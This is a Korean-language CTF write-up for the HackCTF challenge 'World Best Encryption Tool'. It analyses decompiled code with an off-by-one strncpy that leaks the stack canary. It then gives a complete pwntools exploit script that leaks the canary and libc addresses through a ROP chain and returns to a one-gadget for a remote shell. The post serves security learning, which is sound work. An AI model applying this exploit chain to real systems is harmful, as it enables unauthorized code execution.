---
title: "[HackCTF]World Best Encryption Tool"
date: 2020-1-28
tags: [HackCTF]
categories: [HackCTF]
---

Partial RELRO, Canary, NX 걸려있다.

```
[*] '/vagrant/ctfs/World_best_encryption_tool'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

메인에서는 scanf로 입력받아서 50글자 28이랑 xor해주고 strncpy로 57만큼 복사해준다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int i; // [rsp+8h] [rbp-88h]
  char s1; // [rsp+Ch] [rbp-84h]
  char src[64]; // [rsp+10h] [rbp-80h]
  char dest; // [rsp+50h] [rbp-40h]
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  do
  {
    puts("Your text)");
    __isoc99_scanf("%s", src);
    for ( i = 0; i <= 49; ++i )
      src[i] ^= 28u;
    strncpy(&dest, src, 57uLL);
    printf("Encrypted text)\n%s", &dest);
    puts("\nWanna encrypt other text? (Yes/No)");
    __isoc99_scanf("%s", &s1);
  }
  while ( !strcmp(&s1, "Yes") );
  if ( strcmp(&s1, "No") )
    printf("It's not on the option", "No");
  return 0;
}
```

스택은 이런식으로 되어있다. 

```
src(64) | dest(56) | canary(8) | sfp(8) | ret
```

src에서 dest로 복사할때 57만큼 복사하는데 여기서 dest크기는 56인데 canary 1바이트 덮을 수 있고 printf로 인자에 dest가 들어가니까 카나리 릭해줄 수 있다. 그리고 밑에서 또 입력받는데 여기서 카나리 맞춰주고 libc leak해주고 main으로 돌려서 무난하게 원샷 리턴해주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./World_best_encryption_tool')
#p = process('./World_best_encryption_tool')
libc = e.libc
p = remote('ctf.j0n9hyun.xyz',3027)
prdi = 0x00000000004008e3 # pop rdi ; ret

p.sendlineafter('Your text)\n','A'*56+'B')

p.recvuntil('AAAAAA')
canary = u64(p.recv(8)) - 0x42
log.info('canary : ' + hex(canary))

#p.sendlineafter('(Yes/No)\n','Yes')

#payload = 'A'*56 + '\x00'
payload = 'A'*60 + '\x00' + 'B'*63
payload += p64(canary)
payload += 'A'*8
payload += p64(prdi)
payload += p64(e.got['__libc_start_main'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.sendlineafter('(Yes/No)\n',payload)

libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00') - libc.symbols['__libc_start_main']
log.info('libc_base : ' + hex(libc_base))

p.sendlineafter('Your text)\n','A'*56 + '\x00' + 'B'*63 + p64(canary) + 'A'*8 + p64(libc_base + 0x45216))

p.interactive()
```

